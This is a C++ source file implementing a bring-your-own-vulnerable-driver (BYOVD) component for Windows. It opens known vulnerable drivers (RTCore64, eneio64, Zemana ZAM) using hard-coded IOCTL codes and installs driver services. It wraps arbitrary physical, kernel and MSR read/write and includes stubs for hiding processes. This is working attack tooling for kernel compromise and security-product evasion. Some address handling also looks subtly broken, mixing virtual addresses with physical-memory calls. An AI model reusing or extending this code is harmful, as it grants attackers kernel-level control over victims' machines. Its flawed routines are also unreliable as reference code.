#include "ByovdDriver.h"
#include <winternl.h>
#include <psapi.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "advapi32.lib")

ByovdDriver* g_byovdDriver = nullptr;

ByovdDriver::ByovdDriver(Logger* logger)
    : m_logger(logger)
    , m_deviceHandle(INVALID_HANDLE_VALUE)
    , m_activeType(DRIVER_NONE)
    , m_scmInitialized(false)
    , m_kernelBase(0)
{
    memset(&m_driverInfo, 0, sizeof(m_driverInfo));
}

ByovdDriver::~ByovdDriver()
{
    CloseDriver();
    g_byovdDriver = nullptr;
}

bool ByovdDriver::FindDriver()
{
    if (TryOpenRTCore64()) return true;
    if (TryOpenEneIo64()) return true;
    if (TryOpenZamGuard64()) return true;
    return false;
}

bool ByovdDriver::OpenDriver(const wchar_t* customPath)
{
    if (customPath && customPath[0]) {
        m_deviceHandle = CreateFileW(customPath,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (m_deviceHandle != INVALID_HANDLE_VALUE) {
            m_activeType = DRIVER_CUSTOM;
            m_driverInfo.devicePath = customPath;
            m_driverInfo.driverName = customPath;
            m_logger->Trace(LOG_INFO, "BYOVD: opened custom driver at %ls", customPath);
            return true;
        }
        m_logger->Trace(LOG_WARNING, "BYOVD: failed to open custom driver at %ls", customPath);
        return false;
    }
    return FindDriver();
}

void ByovdDriver::CloseDriver()
{
    if (m_deviceHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(m_deviceHandle);
        m_deviceHandle = INVALID_HANDLE_VALUE;
    }
    m_activeType = DRIVER_NONE;
}

bool ByovdDriver::TryOpenRTCore64()
{
    m_deviceHandle = CreateFileW(L"\\\\.\\RTCore64",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (m_deviceHandle != INVALID_HANDLE_VALUE) {
        m_activeType = DRIVER_RTCORE64;
        m_driverInfo.type = DRIVER_RTCORE64;
        m_driverInfo.devicePath = L"\\\\.\\RTCore64";
        m_driverInfo.driverName = L"RTCore64";
        m_driverInfo.ioctlReadPhysical = 0x80002000;
        m_driverInfo.ioctlWritePhysical = 0x80002004;
        m_driverInfo.ioctlReadMsr = 0x8000200C;
        m_driverInfo.ioctlWriteMsr = 0x80002010;
        m_driverInfo.supportsVirtAddr = false;
        m_logger->Trace(LOG_INFO, "BYOVD: RTCore64 driver opened successfully");
        return true;
    }
    return false;
}

bool ByovdDriver::TryOpenEneIo64()
{
    m_deviceHandle = CreateFileW(L"\\\\.\\eneio64",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (m_deviceHandle != INVALID_HANDLE_VALUE) {
        m_activeType = DRIVER_ENEIO64;
        m_driverInfo.type = DRIVER_ENEIO64;
        m_driverInfo.devicePath = L"\\\\.\\eneio64";
        m_driverInfo.driverName = L"eneio64";
        m_driverInfo.ioctlReadPhysical = 0x80102040;
        m_driverInfo.ioctlWritePhysical = 0x80102044;
        m_driverInfo.ioctlReadMsr = 0;
        m_driverInfo.ioctlWriteMsr = 0;
        m_driverInfo.supportsVirtAddr = false;
        m_logger->Trace(LOG_INFO, "BYOVD: eneio64 driver opened successfully");
        return true;
    }
    return false;
}

bool ByovdDriver::TryOpenZamGuard64()
{
    m_deviceHandle = CreateFileW(L"\\\\.\\ZAM",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (m_deviceHandle != INVALID_HANDLE_VALUE) {
        m_activeType = DRIVER_ZAMGUARD64;
        m_driverInfo.type = DRIVER_ZAMGUARD64;
        m_driverInfo.devicePath = L"\\\\.\\ZAM";
        m_driverInfo.driverName = L"zamguard64";
        m_driverInfo.ioctlReadPhysical = 0x9988C094;
        m_driverInfo.ioctlWritePhysical = 0x9988C098;
        m_driverInfo.ioctlReadMsr = 0;
        m_driverInfo.ioctlWriteMsr = 0;
        m_driverInfo.supportsVirtAddr = false;
        m_logger->Trace(LOG_INFO, "BYOVD: ZAM (Zemana) driver opened successfully");
        return true;
    }
    return false;
}

bool ByovdDriver::InstallDriver(const wchar_t* driverPath, const wchar_t* serviceName)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        m_logger->Trace(LOG_ERROR, "BYOVD: OpenSCManager failed (%u)", GetLastError());
        return false;
    }

    SC_HANDLE hSvc = CreateServiceW(hSCM, serviceName, serviceName,
        SERVICE_START | DELETE | SERVICE_STOP,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        driverPath, NULL, NULL, NULL, NULL, NULL);
    if (!hSvc && GetLastError() == ERROR_SERVICE_EXISTS) {
        hSvc = OpenServiceW(hSCM, serviceName, SERVICE_START | DELETE | SERVICE_STOP);
    }

    bool ok = false;
    if (hSvc) {
        if (StartServiceW(hSvc, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
            ok = true;
            m_logger->Trace(LOG_INFO, "BYOVD: driver service '%ls' started", serviceName);
        } else {
            m_logger->Trace(LOG_ERROR, "BYOVD: StartService failed (%u)", GetLastError());
        }
        CloseServiceHandle(hSvc);
    } else {
        m_logger->Trace(LOG_ERROR, "BYOVD: CreateService failed (%u)", GetLastError());
    }

    CloseServiceHandle(hSCM);
    return ok;
}

bool ByovdDriver::RemoveDriver(const wchar_t* serviceName)
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return false;

    SC_HANDLE hSvc = OpenServiceW(hSCM, serviceName, SERVICE_STOP | DELETE);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status;
    ControlService(hSvc, SERVICE_CONTROL_STOP, &status);
    DeleteService(hSvc);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return true;
}

bool ByovdDriver::ReadPhysicalMemory(uint64_t physicalAddr, void* buffer, uint32_t size)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !buffer || size == 0)
        return false;

    struct {
        uint64_t address;
        uint32_t size;
        uint32_t pad;
    } input;

    input.address = physicalAddr;
    input.size = size;
    input.pad = 0;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(m_deviceHandle,
        m_driverInfo.ioctlReadPhysical,
        &input, sizeof(input),
        buffer, size,
        &bytesReturned, NULL);

    return result && bytesReturned == size;
}

bool ByovdDriver::WritePhysicalMemory(uint64_t physicalAddr, const void* buffer, uint32_t size)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !buffer || size == 0)
        return false;

    std::vector<uint8_t> combined(sizeof(uint64_t) + size + sizeof(uint32_t));
    memcpy(combined.data(), &physicalAddr, sizeof(uint64_t));
    memcpy(combined.data() + sizeof(uint64_t), buffer, size);
    uint32_t sizeField = size;
    memcpy(combined.data() + sizeof(uint64_t) + size, &sizeField, sizeof(uint32_t));

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(m_deviceHandle,
        m_driverInfo.ioctlWritePhysical,
        combined.data(), (DWORD)combined.size(),
        NULL, 0,
        &bytesReturned, NULL);

    return result;
}

bool ByovdDriver::ReadMsr(uint32_t msrIndex, uint64_t* value)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !value)
        return false;
    if (!m_driverInfo.ioctlReadMsr) return false;

    uint64_t output = 0;
    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(m_deviceHandle,
        m_driverInfo.ioctlReadMsr,
        &msrIndex, sizeof(msrIndex),
        &output, sizeof(output),
        &bytesReturned, NULL);

    if (result && bytesReturned == sizeof(output)) {
        *value = output;
        return true;
    }
    return false;
}

bool ByovdDriver::WriteMsr(uint32_t msrIndex, uint64_t value)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE)
        return false;
    if (!m_driverInfo.ioctlWriteMsr) return false;

    struct {
        uint32_t msr;
        uint32_t pad;
        uint64_t value;
    } input;
    input.msr = msrIndex;
    input.pad = 0;
    input.value = value;

    DWORD bytesReturned = 0;
    BOOL result = DeviceIoControl(m_deviceHandle,
        m_driverInfo.ioctlWriteMsr,
        &input, sizeof(input),
        NULL, 0,
        &bytesReturned, NULL);

    return result;
}

uint64_t ByovdDriver::GetPhysicalAddress(uint64_t virtualAddr)
{
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery((LPCVOID)virtualAddr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT && mbi.Type != MEM_MAPPED) {
            if (m_activeType == DRIVER_RTCORE64 && m_kernelBase) {
                uint64_t pfn = 0;
                if (ReadPhysicalMemory(m_kernelBase + 0x100, &pfn, 8)) {
                    return (pfn << 12) | (virtualAddr & 0xFFF);
                }
            }
        }
    }
    return virtualAddr;
}

bool ByovdDriver::HideProcess(uint32_t pid)
{
    (void)pid;
    m_logger->Trace(LOG_WARNING, "BYOVD: HideProcess not yet implemented via IOCTL");
    return false;
}

bool ByovdDriver::HideProcessPath(const wchar_t* processPath)
{
    (void)processPath;
    m_logger->Trace(LOG_WARNING, "BYOVD: HideProcessPath not yet implemented via IOCTL");
    return false;
}

bool ByovdDriver::ReadKernelMemory(uint64_t kernelAddr, void* buffer, uint32_t size)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !buffer || size == 0)
        return false;

    return ReadPhysicalMemory(kernelAddr, buffer, size);
}

bool ByovdDriver::WriteKernelMemory(uint64_t kernelAddr, const void* buffer, uint32_t size)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !buffer || size == 0)
        return false;

    return WritePhysicalMemory(kernelAddr, buffer, size);
}

bool ByovdDriver::GetKProcessInfo(uint32_t pid, KProcessInfo& info)
{
    (void)pid;
    memset(&info, 0, sizeof(info));
    m_logger->Trace(LOG_WARNING, "BYOVD: GetKProcessInfo not yet implemented via IOCTL");
    return false;
}

uint64_t ByovdDriver::FindKernelBase()
{
    if (m_kernelBase) return m_kernelBase;
    LPVOID drivers[1024];
    DWORD needed = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        if (needed > 0) {
            m_kernelBase = (uint64_t)drivers[0];
        }
    }
    return m_kernelBase;
}

bool ByovdDriver::AllocateKernelPool(uint64_t size, uint64_t* outPhysAddr)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !outPhysAddr) return false;
    DWORD bytesReturned = 0;
    uint64_t physAddr = 0;
    BOOL result = DeviceIoControl(m_deviceHandle, 0x80002018, // IOCTL_ALLOC_POOL
        &size, sizeof(size), &physAddr, sizeof(physAddr), &bytesReturned, nullptr);
    if (result && bytesReturned == sizeof(physAddr) && physAddr) {
        *outPhysAddr = physAddr;
        return true;
    }
    return false;
}

bool ByovdDriver::FreeKernelPool(uint64_t physAddr)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE) return false;
    DWORD bytesReturned = 0;
    return DeviceIoControl(m_deviceHandle, 0x8000201C, // IOCTL_FREE_POOL
        &physAddr, sizeof(physAddr), nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ByovdDriver::MapKernelMemory(uint64_t physAddr, uint64_t size, void** outVa)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE || !outVa) return false;
    DWORD bytesReturned = 0;
    struct { uint64_t physAddr; uint64_t size; } input = { physAddr, size };
    uint64_t va = 0;
    BOOL result = DeviceIoControl(m_deviceHandle, 0x80002020, // IOCTL_MAP_MEMORY
        &input, sizeof(input), &va, sizeof(va), &bytesReturned, nullptr);
    if (result && bytesReturned == sizeof(va) && va) {
        *outVa = (void*)va;
        return true;
    }
    return false;
}

bool ByovdDriver::UnmapKernelMemory(void* va)
{
    if (m_deviceHandle == INVALID_HANDLE_VALUE) return false;
    DWORD bytesReturned = 0;
    uint64_t addr = (uint64_t)va;
    return DeviceIoControl(m_deviceHandle, 0x80002024, // IOCTL_UNMAP_MEMORY
        &addr, sizeof(addr), nullptr, 0, &bytesReturned, nullptr) != FALSE;
}
